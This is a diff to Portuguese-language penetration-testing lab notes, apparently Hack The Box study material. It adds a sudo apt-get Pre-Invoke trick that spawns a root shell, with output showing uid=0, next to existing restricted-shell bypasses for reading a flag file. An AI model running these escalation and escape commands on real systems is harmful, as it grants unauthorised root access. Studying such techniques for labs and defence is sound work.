@@ -171,6 +171,11 @@ lastlog
 # Ver se mais alguém está atualmente logado no sistema conosco
 w
 
+# Apt-get pode ser usado para sair de ambientes restritos e gerar um shell adicionando um comando Pre-Invoke
+Gust4vo@htb[/htb]$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+id
+uid=0(root) gid=0(root) groups=0(root)
+
 # Bypass de RBASH para leitura de arquivos
 1- while read line; do echo "$line"; done < flag.txt
 2- printf "%s\n" "$( < flag.txt )"
